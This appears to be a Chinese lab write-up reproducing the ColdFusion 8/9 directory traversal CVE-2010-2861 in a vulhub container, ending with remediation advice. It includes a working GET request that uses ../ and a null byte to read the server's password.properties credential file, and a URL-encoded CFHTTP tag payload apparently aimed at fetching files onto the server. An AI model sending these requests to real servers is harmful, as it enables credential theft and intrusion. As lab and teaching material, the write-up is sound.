# 漏洞介绍

Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup
Language）是针对Web应用的一种程序设计语言。

Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。

# 漏洞复现

环境使用的kali +vulhub

    
    
    cd vulhub/coldfusion/CVE-2010-2861
    docker-compose up -d
    

![图片.png](https://image.3001.net/images/20211027/1635297430_6178a896be64c5bc5806e.png!small)

http://172.17.0.1:8500/CFIDE/administrator/enter.cfm  
you-ip初始化页面![图片.png](https://image.3001.net/images/20211027/1635297408_6178a88001e400c730741.png!small)

输入admin后关闭了虚拟机：kali磁盘空间不足![图片.png](https://image.3001.net/images/20211027/1635297597_6178a93d1d2fb485e402d.png!small)没注意到D盘空间满了，删了不需要的，继续运行  
![图片.png](https://image.3001.net/images/20211027/1635298496_6178acc051f1c69247471.png!small)

输入admin  
![图片.png](https://image.3001.net/images/20211027/1635298869_6178ae35167fca06a68c8.png!small)

抓取到的数据包

![图片.png](https://image.3001.net/images/20211027/1635298913_6178ae6172605b4a22f8a.png!small)

抓到的数据包修改

    
    
    GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en HTTP/1.1
    Host: 172.17.0.1:8500
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Length: 0
    

![图片.png](https://image.3001.net/images/20211027/1635301076_6178b6d4deca531706fcc.png!small)

成功

其他问题访问一个不存在的页面，注意编码问题，否则不成功的。

`http://172.17.0.1:8500/%3CCFHTTP%20METHOD%3DGet%20URL%3D%23URL.u%23%20PATH%3D%23URL.p%23%20FILE%3D%23URL.f%23%3E.cfml`

![图片.png](https://image.3001.net/images/20211027/1635300187_6178b35b18d757d00968c.png!small)

# 修复建议

> 配置文件：在配置文件中限制访问的文件目录，比如 PHP 中 php.ini 配置 open_basedir
>
> 特殊字符过滤：检查用户输入，过滤或转义含有“../”、“..\”、“%00”，“..”，“./”，“#”等跳转目录或字符终止符、截断字符的输入
>
> 合法性判断：严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等
>
> 白名单：白名单限定访问文件的路径、名称及后缀名

